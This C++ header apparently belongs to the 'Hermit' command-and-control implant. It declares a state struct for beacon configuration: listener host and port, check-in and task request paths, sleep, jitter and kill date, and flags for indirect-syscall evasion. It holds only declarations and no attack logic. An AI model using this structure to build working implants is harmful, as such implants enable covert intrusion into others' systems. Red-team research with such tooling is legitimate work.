#ifndef HERMIT_CORE_STATE_HPP
#define HERMIT_CORE_STATE_HPP

#include "core/crypt.hpp"
#include "core/socket.hpp"
#include "core/parser.hpp"
#include "core/procs.hpp"
#include "core/syscalls.hpp"
#include "core/system.hpp"

// #include <winsock2.h>
#include <winternl.h>
#include <windows.h>
#include <winhttp.h>

using json = nlohmann::json;

namespace State
{
    struct STATE
    {
        // Crypto
        Crypt::PCRYPT       pCrypt;

        // Thread environment block
        PTEB                pTeb;

        // Module handlers
        HMODULE             hKernel32DLL;
        HMODULE             hNTDLL;
        HMODULE             hWinHTTPDLL;

        // Procedures loaded dynamatically (including syscalls)
        Procs::PPROCS       pProcs;

        // wWinMain arguments
        HINSTANCE           hInstance;
        INT                 nCmdShow;

        // Payload type
        LPCWSTR             lpPayloadType;

        // Payload techniques
        BOOL                bIndirectSyscalls;

        // Listener options
        LPCWSTR             lpListenerProto;
        LPCWSTR             lpListenerHost;
        INTERNET_PORT       nListenerPort;

        // Request paths
        LPCWSTR             lpReqPathCheckIn;
        LPCWSTR             lpReqPathTaskGet;
        LPCWSTR             lpReqPathTaskResult;
        LPCWSTR             lpReqPathDownload;
        LPCWSTR             lpReqPathUpload;
        LPCWSTR             lpReqPathWebSocket;

        // Beacon options
        INT                 nSleep;
        INT                 nJitter;
        INT                 nKillDate;

        // Agent options
        std::wstring        wUUID;
        std::wstring        wTask; // Encrypted
        json                taskJSON;
        json                taskResultJSON;

        // WinHTTP handlers
        HINTERNET           hSession;
        HINTERNET           hConnect;
        HINTERNET           hRequest;

        // Socket
        // Socket::PSOCKET_DATA pSocket;

        // Quit beacon
        BOOL                bQuit;
    };

    typedef STATE* PSTATE;

    VOID Free(PSTATE pState);
}

#endif // HERMIT_CORE_STATE_HPP